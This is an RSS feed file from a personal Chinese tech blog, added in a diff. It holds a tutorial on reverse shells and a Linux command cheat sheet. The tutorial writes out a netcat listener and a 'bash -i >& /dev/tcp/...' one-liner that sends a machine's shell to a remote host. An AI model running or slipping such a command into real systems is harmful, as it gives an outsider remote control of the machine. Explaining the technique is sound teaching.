@@ -1,0 +1,457 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>SnowRoll Blog • Posts by &#34;linux&#34; tag</title>
+        <link>https://snowroll.github.io</link>
+        <description>分享经验，记录生活</description>
+        <language>zh-CN</language>
+        <pubDate>Sat, 13 Aug 2022 07:05:11 +0000</pubDate>
+        <lastBuildDate>Sat, 13 Aug 2022 07:05:11 +0000</lastBuildDate>
+        <category>python</category>
+        <category>codeql</category>
+        <category>crypto</category>
+        <category>Line By Line</category>
+        <category>paper</category>
+        <category>basketball</category>
+        <category>read</category>
+        <category>chatgpt</category>
+        <category>crawler</category>
+        <category>dockerß</category>
+        <category>email</category>
+        <category>github page</category>
+        <category>gitlab</category>
+        <category>linux</category>
+        <category>heartbeat, java</category>
+        <category>latex</category>
+        <category>shell</category>
+        <category>markdown</category>
+        <category>mongodb</category>
+        <category>photograph</category>
+        <category>powershell</category>
+        <category>reverse-shell</category>
+        <category>mail</category>
+        <category>except</category>
+        <category>java</category>
+        <category>travel</category>
+        <item>
+            <guid isPermalink="true">https://snowroll.github.io/reverse-shell/</guid>
+            <title>反向shell</title>
+            <link>https://snowroll.github.io/reverse-shell/</link>
+            <category>linux</category>
+            <category>reverse-shell</category>
+            <pubDate>Sat, 13 Aug 2022 07:05:11 +0000</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;什么是反向shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#什么是反向shell&#34;&gt;#&lt;/a&gt; 什么是反向 shell&lt;/h1&gt;
+&lt;p&gt;我们在客户端 A 通过 &lt;code&gt;ssh&lt;/code&gt;  命令连接服务器 B，从而得到服务器 B 的终端命令行，客户端主动发起的这次连接过程我们称为正向 shell&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh test@10.10.10.1 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;顾名思义，反向 shell 应该由服务器端 B 主动发起，而客户端 A 被动监听，接收这次连接。&lt;/p&gt;
+&lt;p&gt;客户端 A （假设 ip 为 1.2.3.4）&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;bash&#34;&gt; 打开一个端口，监听连接请求&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2333&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;nc（netcat）是 linux 中一个功能强大的网络命令行工具，常用于端口扫描，端口监听。&lt;/p&gt;
+&lt;p&gt;参数说明：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;-l 使用监听模式&lt;/li&gt;
+&lt;li&gt;-vv verbose，使用两次会有更多信息&lt;/li&gt;
+&lt;li&gt;-p 本地端口&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;客户端 A 打开了本地端口 2333，来监听连接请求。因此，我们只需要在服务器端 B 发起一个连接请求，将 B 的 shell 的输入输出发送过来即可完成反向 shell&lt;/p&gt;
+&lt;p&gt;服务器端 B&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/1.2.3.4/2333 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这样就可以成功将 B 的 shell 命令行发送给 A，实现反向 shell&lt;/p&gt;
+&lt;p&gt;参考文章： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC84MGQ2YjVhNjEzNzI=&#34;&gt;https://www.jianshu.com/p/80d6b5a61372&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;命令详解：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;bash 命令行&lt;/li&gt;
+&lt;li&gt;-i 交互模式&lt;/li&gt;
+&lt;li&gt;&amp;gt;&amp;amp; 输出重定向，1 &amp;gt; 可以省略为 &amp;gt;，将标准输出和标准错误输出都重定向到远程。 文件的三种状态，0 标准输入， 1 标准输出， 2 错误输出&lt;/li&gt;
+&lt;li&gt;/dev/tcp/${host}/${port} 建立一个 socket 连接，连接到其他机器&lt;/li&gt;
+&lt;li&gt;0&amp;gt;&amp;amp;1 标准输入重定向到标准输出，由于标准输出已经定向到了远端机器上，所以输入、输出都将定向到远端机器上，实现了反向 shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;由于 Linux 下一切皆文件，所以可以使用 &lt;code&gt;/dev/tcp&lt;/code&gt;  创建一个 socket 套接字，而 &lt;code&gt;/$&amp;#123;host&amp;#125;/$&amp;#123;port&amp;#125;&lt;/code&gt;  则是传入的参数。&lt;/p&gt;
+&lt;h1 id=&#34;反向shell工具&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反向shell工具&#34;&gt;#&lt;/a&gt; 反向 shell 工具&lt;/h1&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZ3NvY2tldC5pby9kZXBsb3kv&#34;&gt;gsocket.io&lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&#34;可能的问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可能的问题&#34;&gt;#&lt;/a&gt; 可能的问题&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;shell 反弹失败&lt;/p&gt;
+&lt;p&gt;可能原因 1:&lt;/p&gt;
+&lt;p&gt;ubuntu 系统打开的终端默认为 &lt;code&gt;sh&lt;/code&gt; ，而 &lt;code&gt;sh&lt;/code&gt;  实际指向的是非交互式终端  &lt;code&gt;dash&lt;/code&gt; ，需要先切换到 &lt;code&gt;bash&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bach -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;-c 执行 command string&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://snowroll.github.io/linux-commands/</guid>
+            <title>linux常用命令汇总</title>
+            <link>https://snowroll.github.io/linux-commands/</link>
+            <category>linux</category>
+            <category>shell</category>
+            <pubDate>Thu, 28 Jul 2022 02:35:04 +0000</pubDate>
+            <description><![CDATA[ &lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;强制命令模式执行： &lt;code&gt;:w !sudo tee %&lt;/code&gt; &lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+  &lt;figure class=&#34;highlight txt&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;w： 表示保存文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;！： 表示执行外部命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tee： linux命令，这个有点复杂，可以查看linux命令帮助&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%： 在执行外部命令时，%会扩展成当前文件名；这个%区别于替换时的%，替换时%的意义是代表整个文件，而不是文件名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 只读文件，不修改强制退出&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;q!&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;上述方式非常完美的解决了不能保存只读文件的问题，但毕竟命令还是有些长，为了避免每次输入一长串的命令，可以将它映射为一个简单的命令加到 .vimrc 中：&lt;/p&gt;
+  &lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot; Allow saving of files as sudo when I forgot to start vim using sudo.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; cmap w!! w !sudo tee &amp;gt; /dev/null %&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这样，简单的运行:w!! 即可。命令后半部分 &amp;gt; /dev/null 作用为显式的丢掉标准输出的内容。&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;strong&gt;删除大量文件&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNjQ3Mjkw&#34;&gt;Linux 下删除大量文件效率对比，看谁删的快！&lt;/span&gt;&lt;/p&gt;
+  &lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 首先建立空文件夹blanktest&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ time rsync -a --delete blanktest/ &lt;span class=&#34;built_in&#34;&gt;test&lt;/span&gt;/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rsync -a --delete blanktest/ &lt;span class=&#34;built_in&#34;&gt;test&lt;/span&gt;/  0.59s user 7.86s system 51% cpu 16.418 total&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16s，很好很强大。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol&gt;
+&lt;li&gt;查看磁盘可用空间&lt;/li&gt;
+&lt;/ol&gt;
+  &lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;df -h  &lt;span class=&#34;comment&#34;&gt;# 查看磁盘可用空间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;du -h --max-depth=1  ./  &lt;span class=&#34;comment&#34;&gt;# 查看当前目录及其目录的文件大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;du -sh ./  &lt;span class=&#34;comment&#34;&gt;# 查看当前目录总大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol&gt;
+&lt;li&gt;apt-get 下载失败 &lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hc2t1YnVudHUuY29tL3F1ZXN0aW9ucy8zNjMyMDAvZS11bmFibGUtdG8tY29ycmVjdC1wcm9ibGVtcy15b3UtaGF2ZS1oZWxkLWJyb2tlbi1wYWNrYWdlcw==&#34;&gt;E: Unable to correct problems, you have held broken packages&lt;/span&gt;&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+  &lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 改用aptitude，更加方便智能&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt-get install aptitude&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aptitude get install yourpkg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;查看进程&lt;/p&gt;
+  &lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 特定用户的特定进程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ps -u root -ef | grep consume &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# kill特定用户的所有进程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 1. 打印出所有pid，再kill&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ps -ef | grep ttlsa | awk &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123; print $2 &amp;#125;&amp;#x27;&lt;/span&gt; | sudo xargs &lt;span class=&#34;built_in&#34;&gt;kill&lt;/span&gt; -9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 2. -v --invert-match 显示不包含匹配文本的所有行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ps -ef | grep dynamic.sh | grep -v grep | awk &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;print $2&amp;#125;&amp;#x27;&lt;/span&gt; | xargs &lt;span class=&#34;built_in&#34;&gt;kill&lt;/span&gt; -9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 3. pgrep -u参数查出用户的所有pid，然后依次kill&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pgrep -u ttlsa | sudo xargs &lt;span class=&#34;built_in&#34;&gt;kill&lt;/span&gt; -9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 查看进程 -e 显示系统内所有进程信息 -l long 长格式显示 -f full 完整显示&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ps -elf&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;ps -aux 解释&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#   user     pid  cpu mem  vsz   rss  tty  stat start time command&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;&amp;gt; chaihua+ 26879 0.0 0.0 112820 968 pts/47 S+  15:49 0:00 grep --color=auto chaihuajun&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;列名&lt;/th&gt;
+&lt;th&gt;解释&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;USER&lt;/td&gt;
+&lt;td&gt;进程的拥有者用户名&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;PID&lt;/td&gt;
+&lt;td&gt;进程的 ID&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;%CPU&lt;/td&gt;
+&lt;td&gt;该进程使用 CPU 资源的百分比&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;%MEM&lt;/td&gt;
+&lt;td&gt;该进程使用内存资源的百分比&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;VSZ&lt;/td&gt;
+&lt;td&gt;进程使用的虚拟内存大小&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;RSS&lt;/td&gt;
+&lt;td&gt;进程使用的实际内存大小&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;TTY&lt;/td&gt;
+&lt;td&gt;进程所绑定的终端&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;STAT&lt;/td&gt;
+&lt;td&gt;进程的状态&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;START&lt;/td&gt;
+&lt;td&gt;进程的启动时间&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;TIME&lt;/td&gt;
+&lt;td&gt;该进程占用 CPU 时间的累计值&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;COMMAND&lt;/td&gt;
+&lt;td&gt;进程所对应的命令&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;其中， &lt;code&gt;-u&lt;/code&gt;  参数指定了只显示与当前用户相关的进程，而  &lt;code&gt;x&lt;/code&gt;  参数指定了显示所有进程，包括没有控制终端的进程。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;查看内存&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;更改文件夹权限及用户&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# -R 递归 修改文件所有者&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chown [-R] username dirname/filename&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 修改文件所在群组&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chgrp [-R] groupname dirname/filename&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 查看用户组&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/group&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 创建群组&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;groupadd groupName&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 将用户添加到指定组 -a append -G 将一个用户添加到多个群组&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;usermod -a -G groupA user&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 修改访问权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# ll 查看文件属性&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;drwxrw-r–&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;d 属性&lt;/li&gt;
+&lt;li&gt;rwx 所有者权限&lt;/li&gt;
+&lt;li&gt;rw- 群组用户权限&lt;/li&gt;
+&lt;li&gt;r-- 其他用户权限&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;chmod&lt;/code&gt;  用数字修改文件访问权限，绝对权限&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;权限&lt;/th&gt;
+&lt;th&gt;数字&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;r&lt;/td&gt;
+&lt;td&gt;4&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;w&lt;/td&gt;
+&lt;td&gt;2&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;x&lt;/td&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;code&gt;chmod&lt;/code&gt;  用字母分配权限，相对权限&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;字母&lt;/th&gt;
+&lt;th&gt;含义&lt;/th&gt;
+&lt;th&gt;符号&lt;/th&gt;
+&lt;th&gt;含义&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;u&lt;/td&gt;
+&lt;td&gt;所有者&lt;/td&gt;
+&lt;td&gt;+&lt;/td&gt;
+&lt;td&gt;添加权限&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;g&lt;/td&gt;
+&lt;td&gt;群组用户&lt;/td&gt;
+&lt;td&gt;-&lt;/td&gt;
+&lt;td&gt;移除权限&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;o&lt;/td&gt;
+&lt;td&gt;其他用户&lt;/td&gt;
+&lt;td&gt;=&lt;/td&gt;
+&lt;td&gt;分配权限&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;a&lt;/td&gt;
+&lt;td&gt;所有用户&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;code&gt;chmod g+rx file&lt;/code&gt;   给群组用户添加可读、可执行权限&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;ssh 配置公私钥&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS9seHcxODQ0OTEyNTE0LzI5NDA3Mjc=&#34;&gt;参考链接：公私钥配置&lt;/span&gt;&lt;/p&gt;
